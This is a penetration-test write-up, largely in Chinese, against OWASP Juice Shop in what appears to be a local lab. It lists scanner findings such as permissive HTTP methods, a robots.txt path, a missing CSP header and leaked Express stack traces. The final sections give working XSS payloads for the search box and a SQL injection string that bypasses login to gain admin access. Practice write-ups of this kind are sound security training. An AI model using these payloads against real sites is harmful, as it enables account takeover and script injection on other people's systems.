# Juice Shop Pentest Writeup

## 识别所用技术

nodejs
## Foundings:
- HTTP Methods Allowed (per directory)

HTTP methods ACL CHECKOUT COPY DELETE GET HEAD LOCK MERGE MKACTIVITY MKCOL MOVE NOTIFY OPTIONS PATCH POST PROPFIND PROPPATCH PUT REPORT SEARCH SUBSCRIBE TRACE UNLOCK UNSUBSCRIBE are allowed on : 
    /
    /assets
    /assets/assets

- Web Server robots.txt Information Disclosure
robots.txt 中含有路径：/ftp


- External URLs
http://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css
 
- INFO Web Server No 404 Error Code Check
  /
    /assets
    /assets/assets
- Missing or Permissive Content-Security-Policy frame-ancestors HTTP Response Header

The CSP frame-ancestors header has been proposed by the W3C Web Application Security Working Group as a way to mitigate cross-site scripting and clickjacking attacks.
The following pages do not set a Content-Security-Policy frame-ancestors response header or set a permissive policy:

  - http://localhost:3000/
  - http://localhost:3000/assets/
  - http://localhost:3000/assets/assets

- Web Application Sitemap

- 敏感信息泄露
http://10.10.10.153:3000/main-es2018.js 中可见路径 /rest/admin，浏览该路径可见下列信息。暴露了所用中间件版本


```

OWASP Juice Shop (Express ^4.17.1)
500 Error: Unexpected path: /rest/admin

       at /juice-shop/routes/angular.js:14:12
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
       at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)
       at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)
       at /juice-shop/routes/verify.js:143:3
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
       at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)
       at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)
       at /juice-shop/routes/verify.js:74:3
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
       at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)
       at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)
       at logger (/juice-shop/node_modules/morgan/index.js:144:5)
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
```

CVE-2014-6393 express: cross-site scripting via content-type header
The Express web framework before 3.11 and 4.x before 4.5 for Node.js does not provide a charset field in HTTP Content-Type headers in 400 level responses, which might allow remote attackers to conduct cross-site scripting (XSS) attacks via characters in a non-standard encoding like UTF-7..


http://10.10.10.153:3000/api/Users

```
OWASP Juice Shop (Express ^4.17.1)
401 UnauthorizedError: No Authorization header was found
```

http://10.10.10.153:3000/api/

OWASP Juice Shop (Express ^4.17.1)
500 Error: Unexpected path: /api

       at /juice-shop/routes/angular.js:14:12
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
       at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)
       at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)
       at /juice-shop/routes/verify.js:143:3
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
       at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)
       at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)
       at /juice-shop/routes/verify.js:74:3
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7
       at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:335:12)
       at next (/juice-shop/node_modules/express/lib/router/index.js:275:10)
       at logger (/juice-shop/node_modules/morgan/index.js:144:5)
       at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
       at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:317:13)
       at /juice-shop/node_modules/express/lib/router/index.js:284:7


### search input XSS漏洞

威胁级别：高危

location：
- 首页search输入框

payload：

`<img src=# onerror="prompt(1)"`

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

```
<iframe src="javascript:alert(`xss`)">.
```

### login 用户名input sql注入漏洞

威胁级别：高危

位置

payload：
```
1' or '1'='1' --'1
```

绕过登录后，获得管理员权限